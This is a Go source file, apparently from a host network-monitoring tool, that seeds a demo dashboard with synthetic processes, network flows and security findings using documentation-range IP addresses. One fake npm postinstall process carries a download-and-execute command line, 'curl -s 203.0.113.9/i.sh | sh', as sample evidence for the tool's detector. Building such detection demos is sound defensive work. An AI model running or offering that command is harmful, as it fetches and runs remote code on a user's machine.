package netship

import "time"

// SeedDemo fills a store with a synthetic scenario so the dashboard is worth
// looking at before anything suspicious happens on the host. Every address is
// from a documentation range (RFC 5737), so none of it can be mistaken for real
// telemetry.
func SeedDemo(s *Store) {
	now := time.Now()
	at := func(d time.Duration) time.Time { return now.Add(-d) }

	// a package postinstall script that phoned home
	install := Process{
		GUID: "demo-install", PID: 4412, PPID: 4410,
		Name: "install.js", Exe: "/usr/bin/node",
		Cmdline:    `node -e require('child_process').execSync('curl -s 203.0.113.9/i.sh | sh')`,
		Cwd:        "/tmp/x7f-2ac1",
		User:       "bittu",
		ParentGUID: "demo-npm", ParentName: "npm",
		FirstSeen: at(6 * time.Minute), LastSeen: at(40 * time.Second),
		OriginRisk: 65,
		OriginWhy: []string{
			"runs from a temporary directory",
			"runs from a package install directory",
			"binary modified in the last 24h",
		},
	}
	why, _ := suspiciousCmdline(install.Cmdline)
	s.UpsertProcess(install)
	s.UpsertFlowsForDemo(
		Flow{Key: "demo-install|203.0.113.9:443/tcp", ProcessGUID: install.GUID,
			RemoteIP: "203.0.113.9", RemotePort: 443, Proto: "TCP", Direction: "OUTBOUND",
			FirstSeen: at(6 * time.Minute), LastSeen: at(40 * time.Second), Ticks: 24,
			Enriched: true, ASN: 47890, Org: "Unmanaged Ltd", Country: "NL", Hosting: false},
		Flow{Key: "demo-install|203.0.113.10:8443/tcp", ProcessGUID: install.GUID,
			RemoteIP: "203.0.113.10", RemotePort: 8443, Proto: "TCP", Direction: "OUTBOUND",
			FirstSeen: at(5 * time.Minute), LastSeen: at(2 * time.Minute), Ticks: 31,
			Enriched: true, ASN: 210644, Org: "Aeza International", Country: "RU", Hosting: false},
	)
	s.AddFinding(Finding{
		ID: "demo-f1", Kind: KindSuspicious, Severity: SevHigh,
		ProcessGUID: install.GUID, ProcessName: install.Name,
		Title:     "Download-and-execute shaped command line",
		Evidence:  []string{why, truncate(install.Cmdline, 240)},
		FirstSeen: at(6 * time.Minute), LastSeen: at(40 * time.Second), Count: 1,
	})
	s.AddFinding(Finding{
		ID: "demo-f2", Kind: KindFirstNetwork, Severity: SevHigh,
		ProcessGUID: install.GUID, ProcessName: install.Name,
		FlowKey: "demo-install|203.0.113.9:443/tcp",
		Title:   "First ever outbound connection: install.js",
		Evidence: []string{
			"first outbound contact from this executable",
			"203.0.113.9:443 · NL · Unmanaged Ltd",
			"runs from a temporary directory",
			"spawned by npm",
		},
		FirstSeen: at(6 * time.Minute), LastSeen: at(6 * time.Minute), Count: 1,
	})
	s.AddFinding(Finding{
		ID: "demo-f3", Kind: KindRiskyOrigin, Severity: SevMedium,
		ProcessGUID: install.GUID, ProcessName: install.Name,
		Title:     "Risky origin went out: install.js",
		Evidence:  []string{"connected to 203.0.113.9:443 · NL · Unmanaged Ltd", "runs from a temporary directory"},
		FirstSeen: at(6 * time.Minute), LastSeen: at(40 * time.Second), Count: 1,
	})

	py := Process{
		GUID: "demo-python", PID: 5120, PPID: 5100,
		Name: "python3", Exe: "/usr/bin/python3",
		Cmdline: "python3 setup.py build", Cwd: "/home/bittu/Downloads/thing-1.2",
		User: "bittu", ParentGUID: "demo-shell", ParentName: "bash",
		FirstSeen: at(22 * time.Minute), LastSeen: at(3 * time.Minute),
		OriginRisk: 30,
		OriginWhy:  []string{"runs from a downloads folder"},
	}
	s.UpsertProcess(py)
	s.UpsertFlowsForDemo(
		Flow{Key: "demo-python|198.51.100.44:8443/tcp", ProcessGUID: py.GUID,
			RemoteIP: "198.51.100.44", RemotePort: 8443, Proto: "TCP", Direction: "OUTBOUND",
			FirstSeen: at(20 * time.Minute), LastSeen: at(3 * time.Minute), Ticks: 88,
			Enriched: true, ASN: 24940, Org: "Hetzner Online", Country: "DE", Hosting: false},
	)
	s.AddFinding(Finding{
		ID: "demo-f4", Kind: KindFirstNetwork, Severity: SevMedium,
		ProcessGUID: py.GUID, ProcessName: py.Name,
		FlowKey:   "demo-python|198.51.100.44:8443/tcp",
		Title:     "First ever outbound connection: python3",
		Evidence:  []string{"first outbound contact from this executable", "198.51.100.44:8443 · DE · Hetzner Online"},
		FirstSeen: at(20 * time.Minute), LastSeen: at(20 * time.Minute), Count: 1,
	})

	// the boring one, which is most of what a working machine looks like
	firefox := Process{
		GUID: "demo-firefox", PID: 2210, PPID: 1,
		Name: "firefox", Exe: "/usr/lib/firefox/firefox",
		Cmdline: "firefox", Cwd: "/home/bittu", User: "bittu",
		FirstSeen: at(4 * time.Hour), LastSeen: at(time.Second),
	}
	s.UpsertProcess(firefox)
	s.UpsertFlowsForDemo(
		Flow{Key: "demo-firefox|192.0.2.51:443/tcp", ProcessGUID: firefox.GUID,
			RemoteIP: "192.0.2.51", RemotePort: 443, Proto: "TCP", Direction: "OUTBOUND",
			FirstSeen: at(11 * time.Minute), LastSeen: at(time.Second), Ticks: 6,
			Enriched: true, ASN: 28573, Org: "Claro NXT Telecomunicacoes", Country: "BR"},
		Flow{Key: "demo-firefox|151.101.105.91:443/tcp", ProcessGUID: firefox.GUID,
			RemoteIP: "151.101.105.91", RemotePort: 443, Proto: "TCP", Direction: "OUTBOUND",
			FirstSeen: at(30 * time.Second), LastSeen: at(time.Second), Ticks: 12,
			Enriched: true, ASN: 54113, Org: "Fastly", Country: "US", Hosting: true},
	)
	s.AddFinding(Finding{
		ID: "demo-f5", Kind: KindNewRemote, Severity: SevLow,
		ProcessGUID: firefox.GUID, ProcessName: firefox.Name,
		FlowKey:   "demo-firefox|192.0.2.51:443/tcp",
		Title:     "New destination for firefox: 192.0.2.51:443 · BR · Claro NXT Telecomunicacoes",
		Evidence:  []string{"baseline for this executable goes back to an earlier session", "192.0.2.51:443 · BR · Claro NXT Telecomunicacoes"},
		FirstSeen: at(11 * time.Minute), LastSeen: at(11 * time.Minute), Count: 1,
	})

	// A few uneventful processes with CDN traffic, so the suppression counter in
	// the demo is not a zero.
	for _, p := range []struct {
		guid, name, exe, cwd string
	}{
		{"demo-code", "code", "/usr/share/code/code", "/home/bittu/Developer/projects/NetShip"},
		{"demo-systemd", "systemd-resolved", "/usr/lib/systemd/systemd-resolved", "/"},
		{"demo-vesktop", "electron", "/usr/lib/electron44/electron", "/usr/lib/vesktop"},
	} {
		s.UpsertProcess(Process{
			GUID: p.guid, PID: int32(1000 + len(p.guid)), Name: p.name, Exe: p.exe,
			Cwd: p.cwd, User: "bittu", FirstSeen: at(5 * time.Hour), LastSeen: now,
		})
		s.UpsertFlowsForDemo(Flow{
			Key: p.guid + "|151.101.105.91:443/tcp", ProcessGUID: p.guid,
			RemoteIP: "151.101.105.91", RemotePort: 443, Proto: "TCP", Direction: "OUTBOUND",
			FirstSeen: at(20 * time.Minute), LastSeen: now, Ticks: 340,
			Enriched: true, ASN: 54113, Org: "Fastly", Country: "US", Hosting: true,
		})
		s.Remember(p.exe, p.name, "151.101.105.91:443/tcp", at(4*time.Hour))
	}

	// Firefox had a history before today. The new remote is the signal.
	for _, r := range []string{"151.101.105.91:443/tcp", "104.16.132.229:443/tcp", "142.250.193.138:443/tcp"} {
		s.Remember(firefox.Exe, firefox.Name, r, at(3*24*time.Hour))
	}
	s.Suppress(1731)
}
